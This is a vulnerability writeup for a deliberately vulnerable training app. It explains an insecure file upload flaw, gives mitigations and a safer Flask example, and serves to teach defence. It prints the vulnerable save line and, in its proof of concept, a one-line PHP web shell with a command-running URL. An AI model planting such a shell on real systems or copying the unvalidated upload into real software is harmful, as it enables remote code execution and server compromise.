# Insecure File Upload Vulnerability Writeup

---

## 🔍 Overview

Insecure File Upload vulnerabilities occur when a web application allows users to upload files without sufficient validation. This can lead to attackers uploading malicious scripts (e.g., web shells), leading to remote code execution or server compromise.

---

## 💥 Location in VulnVault

- **Route:** `/upload`
- **Vulnerable Code Snippet:**

```python
file.save(os.path.join("uploads", file.filename))
````

This code saves any uploaded file directly to the server without validating the file type, content, or filename.

---

## 🧪 Proof of Concept

1. Upload a file named `shell.php` containing:

```php
<?php system($_GET['cmd']); ?>
```

2. Access it via:

```
http://localhost:5000/uploads/shell.php?cmd=ls
```

3. You’ll receive the output of the `ls` command — this demonstrates remote code execution.

> Note: This works in vulnerable environments where `.php` is processed by the server.

---

## 🔓 Impact

* Remote code execution
* Web shell deployment
* Privilege escalation
* Server-side attacks (e.g., pivoting or persistence)

---

## 🛡️ Mitigation Strategies

* **Validate file extensions and MIME types** (e.g., only allow `.jpg`, `.png`)
* **Store files outside the web root** so they can’t be executed via a URL
* **Rename uploaded files** to random strings or UUIDs to prevent targeting
* **Scan uploaded files** using antivirus tools
* **Restrict file permissions** on upload folders
* **Check magic bytes (file signatures)**, not just file extensions

---

## ✅ Example Secure Upload (Flask)

```python
from werkzeug.utils import secure_filename
import uuid

if file and allowed_file(file.filename):
    filename = secure_filename(file.filename)
    extension = filename.rsplit('.', 1)[1].lower()
    new_filename = f"{uuid.uuid4()}.{extension}"
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], new_filename))
```

---

## 🔧 Tools for Testing

* [Burp Suite Repeater/Intruder](https://portswigger.net/burp)
* `curl` or Postman
* Custom web shells (PHP, Python, etc.)

---

## 📚 References

* [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
* [PortSwigger: Insecure File Upload](https://portswigger.net/web-security/file-upload)

---

**Never trust uploaded files. Always treat them as untrusted input, and isolate them accordingly.** 🧨📁
